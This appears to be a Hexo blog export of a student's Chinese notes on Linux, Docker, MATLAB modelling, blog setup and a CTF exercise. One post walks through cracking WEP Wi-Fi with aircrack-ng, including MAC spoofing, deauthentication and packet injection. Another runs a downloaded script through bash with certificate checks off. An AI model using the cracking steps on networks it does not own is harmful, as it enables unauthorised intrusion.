TZ=Asia/Tokyoecho "Your Timezone is = $TZ"dateunset TZecho "Your Timezone is = $(cat /etc/timezone)"# For Redhat or Fedora /etc/localtime date TZ即是TimeZone， 在双引号下 $TZ 会被对应的值取代。在设置好TZ之后显示的date会随着变化。 最好玩的是这句： echo “Your Timezone is = \$(cat /etc/timezone)” 等价于 echo “Your Timezone is = `cat /etc/timezone`“ 数组12345678#!/bin/bashFRUIT[0]=&quot;Pears&quot;FRUIT[1]=&quot;Apple&quot;FRUIT[2]=&quot;Mango&quot;FRUIT[3]=&quot;Banana&quot;FRUIT[4]=&quot;Papaya&quot;echo &quot;First Index: $&#123;FRUIT[0]&#125;&quot;echo &quot;Second Index: $&#123;FRUIT[1]&#125;&quot; 先设置一系列的数组的值，通过在echo使用 ${}如果我们这样做 echo “First Index: $FRUIT[0] “ 打印出来的结果为： First Index: Pears[0] 所以我们必须用一个大括号 如果要一次性打印出数组内所有的内容：12echo &quot;Method One : $&#123;FRUIT[*]&#125;&quot;echo &quot;Method Two : $&#123;FRUIT[@]&#125;&quot;]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[next主题优化]]></title>
    <url>%2F2019%2F02%2F03%2Fnext%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96-1%2F</url>
    <content type="text"><![CDATA[爱美之心人皆有之 写在前面说实话我已经不记得当初是怎么搭建好博客的了，只是感觉next主题的风格实在是太美了，尤其是那些飘动的浮线。 新年要有新气象。 所以我也需要重新考虑自己是不是要针对自己的主题进行一次优化了。 hexo搭建博客在本地搭建hexo博客页面建立在已经安装好了node.js的基础之上 mkdir blogcd blog 之后在blog目录下运行 npm install -g hexo-clihexo init blog 这个时候的博客雏形就已经基本完成了 基本的四个命令如下 hexo clean //清楚静态文件hexo g //生成博客页面hexo s //在本地运行， 默认在4000端口， 可以预览一下效果hexo d //部署到GitHub page上 hexo的主目录下会有如下一些文件和目录 需要注意的是我们此时的操作都是在这个目录下进行的其中的_config.yml文件我们称之为 站点配置文件 默认的主题是 landscape 与GitHub相关联 打开我们的站点配置文件 翻到最后修改为: 最后安装一下git部署插件 npm install hexo-deployer-git —save markdown语法进阶之后再来补坑 寻找图床这个很简单， 平时直接用简书写作就行， 然后直接复制粘贴到自己想要发表的博客上 然后还有一些自我描述， 社交， 打赏什么的也很简单 添加网易云音乐用网易云播放器生成外链， 修改blog\themes\next\layout_macro的sidebar.swig文件，添加刚刚复制的外链代码， 应该就能达到效果了， next主题的配置之后再谈 设置背景挑选图片， 命名为background.jpg ， 放在blog\themes\next\source\images里面，在blog\themes\next\source\css_custom文件的custom.styl首部添加 body {background:url(/images/background.jpg);background-attachment: fixed;} 增加侧边栏菜单条目默认的侧栏菜单条目有：首页、归档、标签、关于、搜索等。如果你想要增加其他的菜单条目，修改主题配置文件_config.yml里的Menu Settings中的menu和menu_icons两个地方 一个是配置页面位置的， 一个是配置图标的，图标来源是Font Awesome , 设置好之后需要在命令行中输入 hexo new page “你所要增加的菜单项名称（要和你在menu中的填写要匹配）” next主题优化下载 cd your-hexo-site git clone https://github.com/iissnan/hexo-theme-next themes/next 启用next修改一下 站点配置文件的theme theme: next next主题设置 Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 设置语言修改站点配置文件的 language: zh-Hans 设置菜单修改主题配置文件的menu —-这里略过， 我很懵]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux文件与磁盘管理]]></title>
    <url>%2F2019%2F02%2F03%2FLinux%E6%96%87%E4%BB%B6%E4%B8%8E%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[写在前面还记得第一次安装虚拟机之后，安装VMware tools的痛苦经历，安装tools的时候会自动弹入一个.tar的文件， 当然我一看就知道是压缩文件， 但是在Linux的图形界面中是怎么也打不开的。 后来百度之后才知道需要用命令行去解压缩， 我的个乖乖， 那么长的文件名我硬是一个个输进去的。。。想想都觉得自己当时好zz 磁盘管理磁盘的构造这部分的内容其实是很重要的，但是我现在还不想写， 虽然这部分的内容我是看了不下很多次， 但是始终不是很明白。 Linux磁盘管理的命令df用来检查文件系统的磁盘空间占用情况-a 列出所有的文件系统， 包括系统特有的/proc等文件系统(记得曾经写过/proc是一个虚拟的文件系统)df可以列出所有的文件系统但是不包括/proc等比较特殊的文件系统） 这里用的是WSL系统， 反映出的文件系统居然没有NTFS。emm不造了 -k , -m, -h 其中 -k是以KB， -m是以MB， -h以一种比较友好的方式显示出来-H 以千进制 替换 1024进制 -T 显示文件系统类型 写道这里我突然明白了， 文件系统和文件系统类型是两个东西， 一个是FileSystem, 另外一个是 FileSystemType 这是不同的概念 -i 不用硬盘容量， 而以inode的数量来显示 inode 的坑之后再补 du也是查看空间的， 但du是对文件和目录磁盘使用的空间的查看参数如下-a 列出所有的文件与目录容量-h 友好的方式-s 列出总量-S 不包括子目录下的总计-k, -m 与df命令一样 fdisk磁盘分区表的操作工具-l 输出后面的接的装置所有的内容 mkfs磁盘格式化命令 mkfs [-t 文件系统格式] 装置文件名 fsck用来检查和维护不一致的文件系统 fsck [-t 文件系统] [-ACay] 装置名称 mount 与umount磁盘挂载与卸载命令 mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n] 装置文件名 挂载点 一次性写这么多我的懵了 这里补充一点笔记 Linux 操作系统的文件数据除了文件实际内容外，通常含有非常多的属性，例如 Linux 操作系统的文件权限（rwx）与文件属性（拥有者、群组、时间参数等）。文件系统通常会将这两部分的数据分别存放在不同的区块，权限与属性存放在 inode 中，至于实际数据则放置到 data block 区块中。另外，还有一个超级区块（superblock）会记录整个文件系统的整体信息，包括 inode 与 block 的总量、使用量、剩余量等。 inode：记录文件的属性，一个文件占用一个 inode，同时记录此文件的数据所在的 block。 在 Linux 中，可以使用 stat 命令查看某个文件的 inode 信息：]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>磁盘管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux目录配置与分区]]></title>
    <url>%2F2019%2F02%2F03%2FLinux%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[写在前面我害怕装Linux双系统， 其实最大的一个原因就是不会分区， 害怕自己分区不对把原有的Windows覆盖掉了，那就得不偿失了 Linux的目录配置FHS 文件层次结构标准 说实话我没看懂上面那张图。 事实上，FHS针对目录树架构仅定义出三层目录下面应该放置什么数据而已，分别是下面这三个目录的定义： / （root, 根目录）：与开机系统有关； /usr （unix software resource）：与软件安装/执行有关； /var （variable）：与系统运行过程有关。（还是鸟哥总结的精辟） 根目录约定FHS规定必须存在 根目录下的/bin 放置可执行文件的目录/boot 放置开机会使用到的文件/dev 设备文件， 比较重要的文件有： /dev/zero， /dev/tty， /dev/sd/etc 系统主要的配置文件几乎都存放在这个目录特别重要的目录有： /etc/modprobe.d/, /etc/passwd, /etc/fstab, /etc/issue/lib 放置函数库的目录/media 软盘， 光盘， DVD等设备都暂时挂载于此/mnt 也是挂载设备的目录， 其中 Windows上的Ubuntu就是通过这个目录去挂载windows上的其他的目录的/opt 第三方协力软件放置的目录/run 开机所产生的信息放置到这个目录下/sbin 设置系统环境的文件的目录/srv 服务的目录/tmp 暂时存放的目录 /usr/var以上两个目录是另外设置的， 但是也位于根目录中。 可选的目录/home /lib /root 先放这张图便于理解目录的层次结构 其中 /proc 是一个虚拟文件系统/sys 也是一个虚拟的文件系统/lost+found 当文件发生错误的时候， 将一些遗失的片段放入到这个目录 /usr目录约定是 Unix software resource 的缩写， 不是User的缩写 必须的目录/usr/bin 所有一般用户能够用到的指令都放在这里/usr/lib 功能与/lib相同， 可以将/lib链接到这个目录/usr/local 系统管理员下载的软件，建议安装到这个目录/usr/sbin 非系统正常运行所需要的指令， 所以可以将/sbin 链接到此目录/usr/share 主要放置只读架构的数据文件，当然也包括共享文件其中可能存在次目录 /usr/share/man 线上说明文档/usr/share/doc 软件杂项的文件说明/usr/share/zoneinfo 与时区有关的文件 /var目录约定必须的目录/var/cache 缓存目录/var/lib 程序执行时候的数据文件放置的目录/var/lock 上锁的目录/var/log 登陆文件放置的目录/var/mail 电子邮件信箱的目录， 不过这个目录也被放置到/var/spool/mail/var/run 放置PID的目录/var/spool 伫列数据的目录 不过鸟哥也总结了，centos 稍做了修改 /bin —&gt; /usr/bin /sbin —&gt; /usr/sbin /lib —&gt; /usr/lib /lib64 —&gt; /usr/lib64 /var/lock —&gt; /run/lock /var/run —&gt; /run]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>FHS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用kali破解无线网络密码]]></title>
    <url>%2F2019%2F02%2F03%2F%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[使用Aircrack-ng破解无线网络无线网络的加密工具有哪些？ 破解WEP加密的无线网络 具体操作如下： 1 使用airmon-ng命令查看当前系统中的无线网络接口。2 修改wlan0接口的MAC地址， 因为MAC地址标识主机所在的网络， 在修改MAC地址之前， 需要停止该接口。命令如下： airmon-ng stop wlan0或者如下： ifconfig wlan0 down 执行以上命令使得wlan0接口停止了， 此时可以修改MAC地址了，命令如下： macchanger --mac 00:11:22:33:44:55 wlan0 3 重新启动wlan0命令如下： airmon-ng start wlan0 4 使用airodump 命令定位附近所有可用的无线网络：命令如下： airodump-ng wlan0 输出的信息含义如下：BSSID 无线的IP地址PWR 网卡报告的信号水平Beacons 无线发出的通告编号#Data 被捕获到的数据分组的数量， 包括广播分组 #/s 过去10秒钟内每秒捕获的数据分组的数量 5 使用airodump-ng 捕获指定BSSID的文件airodump-ng命令常用的选项如下所示。 -c：指定选择的频道。 -w：指定一个文件名，用于保存捕获的数据。 -bssid：指定攻击的BSSID。 示例命令如下： airodump-ng -c wirelessattack -bssid Haddr 6 打开一个新的终端窗口，运行aireplay命令airplay 命令的语法格式如下： aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address] -e [ESSID] [Interface]aireplay-ng -dauth 1 -a [BSSID] -c [our Chosen MAC address] [Interface] 示例命令如下: aireplay-ng -1 0 -a 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 -e Test mon0 7 使用aireplay发送一些数据给无线路由器，以至于能捕获到数据 aireplay-ng 3 -b [BSSID] -h [Our chosen MAC address] [Interface] 示例命令：aireplay-ng -3 -b 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 mon0 8 使用Aircrack破解密码示例命令： `aircrack-ng -b Haddr]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>WLAN</tag>
        <tag>aircrack-ng</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网]]></title>
    <url>%2F2019%2F02%2F01%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[写在前面就在昨天，我在逛推特的时候，无意中发现了一个似曾相识的人，竟然还是twitter推荐给我的！ 于是果断地扣了一下学长，学长告诉我可以自己组建vpn，但是觉得好神奇，后来试了一下，别说，还真行。 知识储备中国国家防火墙 SOCKS 是SOCKetS的缩写是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。 SOCKS是会话层协议，位于表示层和传输层之间。SOCKS的实际例子： Bill希望通过互联网与Jane沟通，但他们的网络之间存在一个防火墙，Bill不能直接与Jane沟通。所以，Bill连接到他的网络上的SOCKS代理，告知它他想要与Jane创建连接；SOCKS代理打开一个能穿过防火墙的连接，并促进Bill和Jane之间的通信。 Shadowsocks一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。维基百科定义 Shadowsocks的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。运行原理： 在服务器端部署完成后，用户需要按照指定的密码、加密方式和端口，使用客户端软件与其连接。在成功连接到服务器后，客户端会在本机上构建一个本地Socks5代理（或VPN、透明代理）。浏览网络时，网络流量会被分到本地Socks5代理，客户端将其加密之后发送到服务器，服务器以同样的加密方式将流量回传给客户端，以此实现代理上网。 主要项目分支：ShadowsocksR 科学上网使用搬瓦工搭建VPS 进入之后就可以看到这个界面了， 当然是选择最便宜的啦不过要注意我们一定要选KVM架构的，只有KVM架构才能使用bbr加速 之后登陆控制面板我们需要安装一个debian 64位的操作系统 然后这个时候在本地去连接VPSssh root@[ip地址] -P[端口号] 使用下面这串代码进行ssr搭建wget -N —no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 大部分都是默认安装 之后 bash ssr.sh 安装bbr加速wget —no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh./bbr.sh 然而上面写的用搬瓦工搭建的一个翻墙只是一个教程， 而且由于跟风者众多， 所以其实效果并不怎么样。 而我呢， 看的是这个刘伟的教程， 不过我经常访问不了他的网站。 用vultr购买服务器之后搭建ss服务， 目前来看ssr服务已经用不了了。 科学上网需谨慎呀]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>fq</tag>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker 实战]]></title>
    <url>%2F2019%2F02%2F01%2Fdocker-%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[引子我花了大概半天多的时间去学习了一些关于docker底层的知识，看的是华为的那本docker实战， 同样的第一遍是一头雾水， 但是之后感觉其中写到的cgroup和namespace， 还有docker最底层的东西的介绍，其实都加深了对docker的认识。在此之上，我使用了我们之前打hctf比赛的源码， 利用它提供的dockerfile成功地搭建了一个ruby on rails网站，第一次领悟到了docker的魅力， 这篇文章讲讲述我使用docker所做的事情， 不断更新中。 利用docker镜像tensorflow环境搭建基于docker搭建tensorflow环境 关于tensorflow我之后再还会继续写一个专题， 暂且按下不表。 从docker hub上pull下一个tensorflow image之后如果想用jupyter notebook来开发， 可以参考如下命令 docker run -it -p 8888:8888 tensorflow/tensorflow 但是我现在都还没有处理好jupyter notebook的远程访问问题(我自己起的名字)，所以还是直接用bash的好其实shell环境下的ipython也是很不错的 docker run -it tensorflow/tensorflow bash ruby on rails web网站搭建这里用到的是hctf的一道web题提供的源码 其实步骤也挺简单的，不过毕竟是自己第一次成功地搭建了一个网站 sudo docker build -t hctf:test .sudo docker run -dt -p 2000:3000 hctf:test bash 然后需要运行一个 ./run.sh 补充一下docker 运行容器内命令的方法， docker exec 进入bash之后再运行 docker exec命令详解 在docker中以交互模式运行一个容器内的sh脚本命令如下： docker exec -it containerID /bin/sh sh脚本的文件路径 或者开启一个bash docker exec -it containerID /bin/bash]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>tensorflow</tag>
        <tag>ruby</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新一年的想法]]></title>
    <url>%2F2019%2F02%2F01%2F%E6%96%B0%E4%B8%80%E5%B9%B4%E7%9A%84%E6%83%B3%E6%B3%95%2F</url>
    <content type="text"><![CDATA[起因回家之后确实颓废了蛮久， 前十天左右都是在忙数模竞赛的事情， 抱着司守奎老师的书啃了半天没看懂讲的是啥。然后回到家之后也挺不适应的， 想想有大概一年没听我妈唠叨了，突然exposed in this situation ， 自然有点令人抓狂。 最令我有点想打人的是， 为啥一到家我的电脑和pad全部罢工， 充不进电！！开始吓坏我了，还以为刚买的就坏了， 后来才之后原来pad这么娇气的呀， 非得用被子裹着， 暖着它， 才肯充进去电。 电脑的问题我也没怎么弄清楚。先放一张图片吧，反正目前能用就行。 经过不过那几天学的也挺多的， 虽然司老师那本书确实有些难， 不过耐不住我天天抱着看嘛(补充一句我看的是电子版,冒得钱), 学会了好多个算法， 像层次分析法， 灰度预测， 线性规划， 熵权法， 还有神经网络算法等等。也让我明白了计算机这个学科的某些特殊性。之后就是连着几天的昏天黑地的写论文了， 不过在这段时间我迷上了铁齿铜牙纪晓岚， 从中也学会了许多做人的道理， 甚至，还有一些为官的道理， 毛主席说的好嘛， 政治，就是把支持我们的人搞得多多的， 把反对我们的人搞得少少的， 这就是政治了， 想想去年一年担任学习部部长， 要是早点知道这条道理，也不至于过的那么惨嘛hhh。某一天想起来逛了以下szf大佬的博客， 看到他也写了一篇新一年的规划什么的， 不过字数肯定没我的多。 本来想着当时也写一篇的， 但是由于种种原因耽误了， 现在想想， 我所谓的新年嘛， 当然是指农历的新年咯， 所以在还有三天之后就过年的这个时间点， 我就写下这篇新年的想法吧。 回顾回顾2018吧， 我现在想想又做了些啥呢？ 其实2018年做的好多事都是一个引子， 就比如简书吧， 那是我2018年年初的时候开始入坑的， 现在我已经离不开这个平台了， 再之后是git， 一个版本控制工具， 我曾今还把git和GitHub傻傻分不清， 然而现在， GitHub这个最大的源代码托管平台， git这个及其强大的版本控制工具， 不管是管理自己的文件还是开发， 都是我最离不开的。 除此之外， 还有很多， 2018年我打开了好多个事物的大门， 2019年就需要我不断地在这些方面发力了。总结一下我需要在哪些东西上面发力吧。 总结 云计算： docker， gcp， AWS 后端： Django， flask 游戏： Unity 软件： 逆向， pwn web： 各种渗透测试的工具 操作系统：Linux， 主要是ubuntu&amp;kali 有时候很悲观，总觉得自己想学那么多，结果啥都学不会但是有时候又很乐观， 想不断地去学习新的东西， 以至于什么都去钻。维持这种不断往外扩张的，我觉得也行，但是一定要集中精力学完一样之后方可开始去学的新的东西。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[flag.php 未完成的wp]]></title>
    <url>%2F2019%2F01%2F29%2Fflag-php-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[写在前面好吧我承认我是看了别人的wp，目前还很菜 然而我看了wp也不会做。 初探进去之后是一个什么都点不动的页面。。 然后有提示 hint联系到可能是SQL注入 于是在URL后面加一个hint参数http://123.206.87.240:8002/flagphp/?hint=1 得到一串代码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?php error_reporting(0); include_once("flag.php"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === "$KEY") &#123; echo "$flag"; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel="stylesheet" href="admin.css" type="text/css"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt; 分析代码第一句话把报错信息都关掉了然后包含了一个文件flag.php(这不正好是题目的名字？)然后设置cookie额。。然后如果GET得到了hint， 就会把文件的代码都展示出来 否则如果\$cookie反序列化后得到的结果等于字符串”$KEY”，就会显示flag！ 补充：目前为止这个题目还没做出来。主要是对cookie和serialize这两个不熟悉 cookie目前看到一篇 cookie详解 到底什么是cookie，怎样才会产生cookie， cookie的作用自不必言。产生cookie有几种方式：server端 的response中包含cookie设置 脚本方式种植cookie， 主要就是用javascript里的document.cookie对象来实现 通过在URL栏输入 javascript:alert(document.cookie) 可以查看这个页面的cookie 当然cookie还有很多 属性， 比如为了安全而设置的http only属性， cookie的生存周期等。 serializeserialize() 函数用于序列化对象或数组，并返回一个字符串。serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize() 语法如下：string serialize ( mixed $value )将其看作一种变化或许可以 2月6日更新 更新笔记最近在家挺懒散的， 走亲戚实在是太累了， 然后自己又克制不住冲动， 唉要沉下心来刷ctf了 在线测试平台PHP在线平台 所以这就是”$KEY” 序列化后的结果。 其实序列化是有规律可循的， 之前看到过一篇文章但是我忘记链接了。 不过你看， “$KEY”是一个字符串， 所以是 s，然后是字符串的长度， 最后是字符串的原文。所以， 这里的序列化有问题？？ 关于echo经实验得知， php中的echo和Linux bash中的echo很相似 进一步分析代码$cookie = $_COOKIE[&#39;ISecer&#39;]; 这一步获取到了 服务器预先设定的cookie， 也就是 ISecer: key unserialize($cookie) === &quot;$KEY&quot; $cookie 应该是 string类型， 反序列化之后 要和 \$KEY 对应的值相等 但是题目挖了坑， 在这之前其实我们发现 \$KEY 应该是没定义的。 且慢， include_once(&quot;flag.php&quot;); 我们不得而知， flag.php文件中是否包含了 对于$KEY 的定义 这就需要看一下 include_once函数了 关于include_once函数 include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。 似乎并没有什么特殊的地方 未解的谜题写到这里其实我还是一无所知， 题目也没有做出来。 但是在深究题目的过程中， 理解了cookie和 serialize 等函数的用法， 算是一桩收获吧]]></content>
      <categories>
        <category>bugkuctf</category>
      </categories>
      <tags>
        <tag>cookie</tag>
        <tag>serialize</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[灰色预测模型]]></title>
    <url>%2F2019%2F01%2F25%2F%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[灾变预测模型 这是某个地区降水量的数据，规定变量zeta &lt; 320为灾年 计算用的matlab程序如下12345678910111213141516171819202122232425clc, clear%写出初始数据a=[390.6, 412, 320, 559.2, 380.8, 542.4, 553, 310, 561, 300, 632,...540, 406.2, 540, 406.2, 313.8, 576, 587.6, 318.5]';t0=find(a&lt;= 320);n=length(t0);%做累加运算t1=cumsum(t0);z1=0.5*t1(1:end-1)+0.5*t1(2:end);%求出B矩阵B=[-z1, ones(n-1, 1)];Y=t0(2:end);%左除法r=B\Y;y=dsolve('Dy+a*y=b', 'y(0)=y0');%替换变量y=subs(y, &#123;'a','b','y0'&#125;, &#123;r(1), r(2), t1(1)&#125; );yucel=subs(y, 't', [0:n+1]);%为了提高预测精度，先计算预测值，再显示微分方程的解y=vpa(y, 6);yuce=diff(yucel);yuce=[t0(1), yuce]yuce_new=yuce(n+1: end) 同样的一个类似的预测模型 代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879A=[83.0, 79.8,78.1,85.1,86.6,88.2,90.3,86.7,93.3,92.5,90.9,96.9; 101.7,85.1,87.8,91.6,93.4,94.5,97.4,99.5,104.2,102.3,101.0,123.5; 92.2,114.0,93.3,101.0,103.5,105.2,109.5,109.2,109.6,111.2,121.7,131.3; 105.0,125.7,106.6,116.0,117.6,118.0,121.7,118.7,120.2,127.8,121.8,121.9; 139.3,129.5,122.5,124.5,135.7,130.8,138.7,133.7,136.8,138.9,129.6,133.7; 137.5,135.3,133.0,133.4,142.8,141.6,142.9,147.3,159.6,162.1,153.5,155.9; 163.2,159.7,158.4,145.2,124,144.1,157.0,162.6,171.8,180.7,173.5, 176.5]; T=A(1:6, 1:12);%对前六年求平均x0=mean(T');x1=zeros(size(x0));n=length(x1);x1(1)=x0(1);%做一次累加求和for i=2:n x1(i)=x1(i-1)+x0(i);endz=zeros(size(x0));af=0.4;for i=2:n z(i)=af*x1(i)+(1-af)*x1(i-1);endY=zeros(n-1, 1);B=zeros(n-1, 2);%构造出B和Y矩阵，也就是灰色方程for i=2:n Y(i-1, 1)=x0(i); B(i-1, 1)=-z(i); B(i-1, 2)=1;end%计算(a, b)'Para=inv(B'*B)*B'*Y;a=Para(1);b=Para(2);%预测值Pred=(x0(1)-b/a)*exp(-a*n)*(1-exp(a));%预测第n+1年的数据Total=12*Pred;%估计各月所占比重r=sum(T)/sum(sum(T));%预测各个月销售量Px=Total*r;fprintf('输出203年预测值与实际值.\n');for i=1:12 fprintf('%5d ', i);endfprintf('\n');for i=1:12 fprintf('%6.1f', Px(i));endfprintf('\n');for i=1:12 fprintf('%6.1f', A(7, i));endfprintf('\n');Error=sum(Px(4:6))-sum(A(7, 4:6));fprintf('2003年4,5,6月SARS导致减少销售额%6.2f亿元\n',Error);%作图 subplot(2,1,1); PA=[A(1,:),A(2,:),A(3,:),A(4,:),A(5,:),A(6,:),A(7,:)];%变为一行数据 plot(PA); grid on title('原始数据'); subplot(2,1,2); plot(1:12,A(7,:),'b*',1:12,Px,'r'); title('2003年对比数据'); grid on 最后得到的图形为]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我和Linux的故事]]></title>
    <url>%2F2018%2F12%2F21%2F%E6%88%91%E5%92%8CLinux%E7%9A%84%E6%95%85%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[写在前面依稀记得是去年这个时候接触到的Linux，当时装了一个Ubuntu的虚拟机，但是没怎么用，虽然感觉和Windows系统很像，但是毕竟不熟练，所以就没怎么关注这个系统，转眼间，Ubuntu系统都已经更新到了18.04LTS版本了。 由于参加ctf比赛的经历让我意识到Linux是一个很重要的操作系统，以后也会和它接触的很多，所以今年的年末不知道怎么心血来潮，开始折腾Linux， docker， git， bash这些工具了。 先把一些东西记在小本本上: deb https://mirrors.ustc.edu.cn/linuxmint/ tara main upstream import backportdeb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb http://archive.canonical.com/ubuntu/ bionic partner 对，这是Linux mint发行版的镜像源。 一点小感慨第一次接触Linux的感觉已经淡淡消去了， 不过那个时候没有花很多的力气去了解这个操作系统， 直到很多工具在Linux上用的特别顺手的时候才真正的体会到Linux是有多么的好用。 不过就个人来说， Linux确实不适合个人计算机， 我当时就是囿于个人思维， 无法领会到为什么Linux要把文件权限分的那么清楚。不过就计算机发展的早期来说， 多任务， 分时， 支持多个用户的计算机操作系统才是主流， 那会儿都没有个人计算机这个概念呢！ Linux好用在哪 apt-get 快速安装自己想要的软件包 正则表达式方便我们查找文件 vim编辑器 管道命令， shell scripts 各种实用工具 我能用Linux干什么 毫无疑问， 管理自己的服务器！只有自己亲自部署一个服务器，然后在本地去远程连接的时候你才知道Linux是多么的有用 docker虚拟化技术， 使用docker file快速的在云端部署生产环境 黑客工具箱， kali操作系统(不过我现在很不喜欢这个操作系统了， burp是社区版， ssh服务开启贼麻烦， 想装双系统更是遇到一些神奇的错误) 管理Linux系统， 维护云端的环境 目前来看，使用Linux直接编辑代码还有一定的难度， 主要是vim和gcc， gdb这些工具使用的不是很熟悉。不知道怎么调试代码， 缺少GUI的直观 Linux怎么学学Linux真的就像小学学九九乘法口诀表， 不背点东西是啥都不会的。 Linux好用， 这是对于那些熟悉了命令的人来说，就想乘法也很好算， 但是这是对那些熟悉了乘法表的人来说 乘法也就是小菜一碟 所以啊， 学Linux必须要过几关， 一关是bash， shell scripts， 一关是vim编辑器， 还有就是各种命令的常见参数要记得。 这些， 都要练呀。 最后修改于2019年2月3日]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UEFI和legacy]]></title>
    <url>%2F2018%2F12%2F20%2FUEFI%E5%92%8Clegacy%2F</url>
    <content type="text"><![CDATA[UEFI和legacy闲着那台旧电脑没地方用，然后开机看了看，woc 2G内存 辣鸡AMD处理器 居然。。。win10系统2秒钟开机。。。 天哪，这就是联想的厉害吗。 然后开始装Ubuntu 好像我很傻逼。。。 看了这篇博客 才知道，分区要合理的规划。。。Windows下面没这个要求来着？？？ 分区的建议: /boot - 200MB 实际需求 100~200MB / 15~20GB /home 存放用户数据，多多益善。 /swap 可以不用吧 别跑题了，我本来是想探究用UEFI和legacy引导方式的区别的 EFI全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。通俗的说，UEFI是一种新的主板引导初始化的标注设置，具有启动速度快、安全性高和支持大容量硬盘而闻名。出现这种技术的主要作用基本上就是为了实现开机快的效果，由于win8系统支持这种引导方式的启动，所以速度略显的有点快， 上面说的好像不是人话23333 其实我主要的问题就是 在我装双系统的时候，为什么legacy是无法引导U盘中的系统的 只要当我全部启用了UEFI引导的时候才成功了。 2019年2月3日更新一波 UEFIUEFI 是一种新兴的启动方式， 就是一个特定的分区， 200M左右， 让bios启动的时候直接把引导权限交给这个分区，这样你就可以使用鼠标了，因为传统的legacy模式下只能用键盘， 还可以做到连接无线自动下载镜像安装。 问题这就是为什么， 有时候安装Linux需要切换到legacy模式了，然而如果原来的系统是UEFI模式下安装的， 